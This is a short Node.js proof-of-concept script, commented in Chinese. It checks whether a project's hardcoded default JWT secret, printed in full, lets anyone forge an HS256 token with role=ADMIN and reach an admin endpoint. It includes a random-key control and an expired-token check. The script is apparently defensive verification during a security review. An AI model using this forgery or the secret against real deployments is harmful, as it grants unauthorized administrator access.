/**
 * 安全验证 PoC：JWT 默认密钥是否可伪造管理员令牌
 *
 * 背景：application.yml 里 `zhiguan.jwt.secret` 带一个**写死在源码/仓库里**的默认值，
 * docker-compose.yml 又没有注入 JWT_SECRET。若默认值生效，任何读过这个公开仓库的人
 * 都能用同一密钥签出 role=ADMIN 的令牌。
 *
 * 本脚本只用 Node 内置 crypto，不依赖任何库：
 *   1. 用默认密钥自签一个 role=ADMIN 的 HS256 JWT
 *   2. 拿它访问 /api/v1/admin/posts/pending（仅 ADMIN 可访问）
 *   3. 同时对照：用一个随机密钥签的同结构令牌应当被拒
 *
 * 用法：node .workbuddy/_poc_jwt_default_secret.mjs [baseUrl]
 */
import { createHmac, randomBytes } from 'node:crypto'

const BASE = (process.argv[2] || 'http://127.0.0.1:8088').replace(/\/$/, '')
const DEFAULT_SECRET = 'ZhiGuan-GuJian-2024-SecretKey-For-JWT-Token-Generation-Must-Be-Long-Enough'

const b64u = (buf) => Buffer.from(buf).toString('base64url')

function sign(payload, secret) {
  const header = { alg: 'HS256', typ: 'JWT' }
  const h = b64u(JSON.stringify(header))
  const p = b64u(JSON.stringify(payload))
  const sig = createHmac('sha256', secret).update(`${h}.${p}`).digest()
  return `${h}.${p}.${b64u(sig)}`
}

async function callAdmin(token) {
  const res = await fetch(`${BASE}/api/v1/admin/posts/pending?page=1&size=1`, {
    headers: { Authorization: `Bearer ${token}` }
  })
  const text = await res.text()
  return { status: res.status, body: text.slice(0, 160) }
}

const now = Math.floor(Date.now() / 1000)
const payload = { sub: '1', username: 'forged', role: 'ADMIN', iat: now, exp: now + 3600 }

console.log(`\n══ JWT 默认密钥伪造 PoC ══  base=${BASE}\n`)

const forged = sign(payload, DEFAULT_SECRET)
const r1 = await callAdmin(forged)
console.log('① 用**仓库内公开的默认密钥**自签 role=ADMIN 令牌 → 访问 /api/v1/admin/posts/pending')
console.log(`   HTTP ${r1.status}   ${r1.body}`)
console.log(r1.status === 200
  ? '   ⚠️  成功 —— 默认密钥生效，任何读过仓库的人都能拿到管理员权限\n'
  : '   ✅ 被拒 —— 默认密钥未生效（JWT_SECRET 已被覆盖）\n')

const rnd = randomBytes(48).toString('hex')
const control = sign(payload, rnd)
const r2 = await callAdmin(control)
console.log('② 对照组：用随机密钥签同结构令牌（应当被拒）')
console.log(`   HTTP ${r2.status}   ${r2.body}`)
console.log(r2.status !== 200 ? '   ✅ 被拒（说明校验逻辑本身正常，问题只在密钥默认值）\n' : '   ❌ 竟然通过，校验逻辑有问题\n')

// 额外：验证过期令牌返回 401 还是 403（前端拦截器只对 401 跳登录）
const expired = sign({ ...payload, exp: now - 60 }, DEFAULT_SECRET)
const r3 = await callAdmin(expired)
console.log('③ 过期令牌访问受保护接口')
console.log(`   HTTP ${r3.status}   ${r3.body}`)
console.log(r3.status === 401
  ? '   ✅ 返回 401（前端拦截器会跳登录）\n'
  : `   ⚠️  返回 ${r3.status} 而非 401 —— 前端 axios 拦截器只在 401 时跳登录，\n      过期 token 会让用户卡在报错页而无法被引导重新登录\n`)
